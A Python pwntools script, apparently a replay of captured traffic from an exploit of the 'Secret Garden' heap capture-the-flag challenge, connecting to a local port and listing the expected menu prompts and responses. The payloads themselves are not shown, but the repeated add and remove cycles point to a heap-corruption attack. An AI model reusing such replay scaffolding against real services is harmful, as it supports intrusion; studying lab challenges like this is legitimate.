import os
os.environ['PWNLIB_NOTERM']='1'
from pwn import *
context.log_level = 'info'
p = remote( '127.0.0.1', 10002)
LOG_FORMAT = "%(asctime)s - %(levelname)s - %(message)s"
logging.basicConfig(stream=sys.stdout, level=logging.DEBUG, format=LOG_FORMAT)
logging.info("ori tracffic data file: /tmp/2020_10_19_14_50_39_053699_d7c8.rebuild")

check_str = []
check_str.append(b'\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')
check_str.append(b'Successful\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Name of the flower[1] :22222222\nColor of the flower[1] :1\nName of the flower[2] :33333333\nColor of the flower[2] :1\nName of the flower[3] :$$$$$$\nColor of the flower[3] :1\nName of the flower[4] :44444444\nColor of the flower[4] :1\nName of the flower[5] :55555555\nColor of the flower[5] :1\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')
check_str.append(b'Successful\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')
check_str.append(b'Successful\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')
check_str.append(b'Successful\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')
check_str.append(b'Successful\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')
check_str.append(b'Successful\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')
check_str.append(b'Successful\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Length of the name :')
check_str.append(b'The name of flower :')
check_str.append(b'The color of the flower :')
